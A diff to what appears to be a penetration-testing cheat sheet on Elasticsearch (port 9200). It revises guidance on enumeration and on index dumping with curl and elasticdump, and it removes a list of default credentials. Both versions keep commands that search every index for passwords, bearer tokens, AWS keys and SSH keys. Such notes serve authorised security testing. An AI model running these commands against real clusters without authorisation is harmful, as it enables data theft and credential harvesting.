@@ -1,7 +1,7 @@
 # Elasticsearch (9200)
 
 !!! tip "Start here"
-    Test unauthenticated access first: `curl http://$IP:9200/`. If it returns a JSON banner with cluster info, you have full read access to every index. Elasticsearch prior to 8.x shipped with security disabled by default, internal deployments are almost always unauthenticated.
+    Test both HTTP and HTTPS. A JSON banner confirms Elasticsearch; it does not prove access to every index. Elasticsearch 8.x enables authentication and TLS automatically, while older or explicitly unsecured clusters may allow anonymous API access.
 
 ---
 
@@ -9,10 +9,11 @@
 
 ```bash
 nmap -p 9200 -sV --script http-enum $IP
-curl -s http://$IP:9200/                         # cluster banner, version
-curl -s http://$IP:9200/_cluster/health          # cluster state
-curl -s http://$IP:9200/_cat/indices?v           # list all indices
-curl -s http://$IP:9200/_cat/nodes?v             # cluster nodes
+curl -s "http://$IP:9200/"                         # cluster banner, version
+curl -sk "https://$IP:9200/"                       # current secured deployments commonly use TLS
+curl -s "http://$IP:9200/_cluster/health"          # cluster state
+curl -s "http://$IP:9200/_cat/indices?v"           # list all indices
+curl -s "http://$IP:9200/_cat/nodes?v"             # cluster nodes
 ```
 
 ---
@@ -22,20 +23,20 @@ curl -s http://$IP:9200/_cat/nodes?v             # cluster nodes
 Dump an entire index (up to 10k hits per request):
 
 ```bash
-curl -s 'http://$IP:9200/<index>/_search?size=10000&pretty' > index_dump.json
+curl -s "http://$IP:9200/$INDEX/_search?size=10000&pretty" > index_dump.json
 ```
 
 Search for specific content across all indices:
 
 ```bash
-curl -s 'http://$IP:9200/_search?q=password&size=100&pretty'
-curl -s 'http://$IP:9200/_search?q=api_key&pretty'
+curl -s "http://$IP:9200/_search?q=password&size=100&pretty"
+curl -s "http://$IP:9200/_search?q=api_key&pretty"
 ```
 
 For large indices, use the scroll API or `elasticdump`:
 
 ```bash
-elasticdump --input=http://$IP:9200/<index> --output=index.json --type=data
+elasticdump --input="http://$IP:9200/$INDEX" --output=index.json --type=data
 ```
 
 ---
@@ -45,23 +46,23 @@ elasticdump --input=http://$IP:9200/<index> --output=index.json --type=data
 If basic auth is enabled:
 
 ```bash
-curl -u elastic:<pass> http://$IP:9200/_cat/indices?v
+curl -u "elastic:$PASSWORD" "http://$IP:9200/_cat/indices?v"
 ```
 
-Default/common credentials worth trying: `elastic:changeme`, `elastic:elastic`, `kibana:changeme`.
+Use approved credentials from the engagement rather than assuming historical defaults. Current installations generate credentials during security setup.
 
 ---
 
 ## Credential and Secret Hunting
 
-Elasticsearch indices are a gold mine for passive credential discovery, logs, audit records, and forwarded syslog often contain cleartext secrets:
+Logs and application indices can contain tokens, headers, or credentials. Search only indices approved for collection and minimize exported data:
 
 ```bash
 # Common fields to search
-curl -s 'http://$IP:9200/_search?q=authorization&pretty'
-curl -s 'http://$IP:9200/_search?q=bearer&pretty'
-curl -s 'http://$IP:9200/_search?q=aws_access_key&pretty'
-curl -s 'http://$IP:9200/_search?q=ssh-rsa&pretty'
+curl -s "http://$IP:9200/_search?q=authorization&pretty"
+curl -s "http://$IP:9200/_search?q=bearer&pretty"
+curl -s "http://$IP:9200/_search?q=aws_access_key&pretty"
+curl -s "http://$IP:9200/_search?q=ssh-rsa&pretty"
 ```
 
 ---
@@ -74,6 +75,3 @@ use auxiliary/scanner/elasticsearch/indices_enum
 set RHOSTS $IP
 run
 ```
-
-!!! tip "Real-world"
-    Unauthenticated Elasticsearch shows up constantly on internal networks, it's usually the backend for Kibana, ELK stack logging, or application search. The indices themselves often contain more sensitive data than the production databases they're indexed from: full request bodies, error traces with session tokens, and historical log data that predates any security review. Always dump the indices list first and grep offline.
